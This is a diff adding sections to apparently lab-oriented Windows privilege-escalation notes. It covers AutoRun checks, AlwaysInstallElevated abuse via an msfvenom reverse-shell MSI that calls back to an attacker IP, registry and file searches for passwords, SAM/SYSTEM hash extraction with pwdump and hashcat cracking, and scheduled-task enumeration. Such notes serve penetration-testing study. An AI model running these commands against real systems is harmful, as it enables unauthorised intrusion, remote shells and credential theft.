@@ -31,6 +31,11 @@ Run specific check categories:
 Run winPEAS to check for service misconfigurations:  
 `.\winPEASany.exe quiet servicesinfo`
 
+Use winPEAS to check for writable AutoRun executables:  
+`.\winPEASany.exe quiet applicationsinfo`  
+Alternatively, we could manually enumerate the AutoRun executables:  
+`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
 ### Windows Kernel Exploits
 
 • post/multi/recon/local_exploit_suggester  
@@ -76,6 +81,72 @@ Windows resolves this ambiguity by checking each of the possibilities in turn.
 If we can write to a location Windows checks before the actual executable, we
 can trick the service into executing it instead.
 
+#### AlwaysInstallElevated
+
+MSI files are package files used to install applications.  
+These files run with the permissions of the user trying to install them.  
+Windows allows for these installers to be run with elevated (i.e. admin) privileges.  
+If this is the case, we can generate a malicious MSI file which contains a reverse shell.  
+
+The catch is that two Registry settings must be enabled for this to work.  
+The “AlwaysInstallElevated” value must be set to 1 for both the local machine:  
+`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`  
+and the current user:  
+`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`  
+If either of these are missing or disabled, the exploit will not work.
+
+ Use winPEAS to see if both registry values are set:  
+`.\winPEASany.exe quiet windowscreds`  
+Alternatively, verify the values manually:  
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+
+Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:  
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi`  
+Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:  
+`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`  
+
+#### Passwords
+
+The following commands will search the registry for keys and values that contain “password”  
+`reg query HKLM /f password /t REG_SZ /s`  
+`reg query HKCU /f password /t REG_SZ /s`  
+
+Use winPEAS to check common password locations:  
+`.\winPEASany.exe quiet filesinfo userinfo`  
+
+Use winPEAS to check for saved credentials:  
+`.\winPEASany.exe quiet cmd windowscreds`  
+We can verify this manually using the following command:  
+`cmdkey /list`
+
+#### Configuration Files
+
+Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:  
+`dir /s *pass* == *.config`  
+Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:  
+`findstr /si password *.xml *.ini *.txt`  
+Use winPEAS to search for common files which may contain credentials:  
+`.\winPEASany.exe quiet cmd searchfast filesinfo`  
+
+
+#### SAM/SYSTEM Locations
+
+The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
+The files are locked while Windows is running.
+Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
+
+Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:  
+`python2 creddump7/pwdump.py SYSTEM SAM`  
+Crack the admin user hash using hashcat:  
+`hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da rockyou.txt`
+
+#### Scheduled Tasks
+
+List all scheduled tasks your user can see:  
+`schtasks /query /fo LIST /v`  
+In PowerShell:  
+`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
 
 ### PrivescCheck
 ```cmd
